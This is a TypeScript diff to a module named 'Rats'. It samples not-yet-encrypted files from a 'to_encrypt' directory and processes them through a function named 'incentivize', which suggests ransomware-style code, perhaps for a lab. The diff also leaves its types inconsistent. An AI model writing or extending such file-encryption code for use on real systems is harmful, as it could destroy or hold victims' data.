@@ -1,4 +1,4 @@
-import { getFiles, sampleN, FileEntry } from "./helpers";
+import { getFiles, getFilesNotEncr, sampleN, FileEntry } from "./helpers";
 import fs from 'fs';
 
 const ENCRYPTION_DIR = './src/to_encrypt';
@@ -7,10 +7,12 @@ const ENCRYPTION_DIR = './src/to_encrypt';
 export interface Rats {
     listIncentives: (count: number) => Promise<FileEntry[]>,
     incentivize: (file: FileEntry) => void
+    getFiles: (dir: string) => Promise<string[]>,
+    readFile: (path: string) => string
 }
 
-async function listIncentives(count = 8): Promise<FileEntry[]> {
-    const files = await getFiles(ENCRYPTION_DIR);
+async function listIncentives(count = 8): Promise<string[]> {
+    const files = await getFilesNotEncr(ENCRYPTION_DIR);
     return sampleN(files, count);
 }
 
@@ -57,4 +59,8 @@ function incentivize(file: FileEntry): void {
     fs.closeSync(writeFd);
 }
 
-export default { listIncentives, incentivize };
+function readFile(path: string): string {
+    return fs.readFileSync(path, 'utf-8');
+}
+
+export default { listIncentives, incentivize, getFiles, readFile };
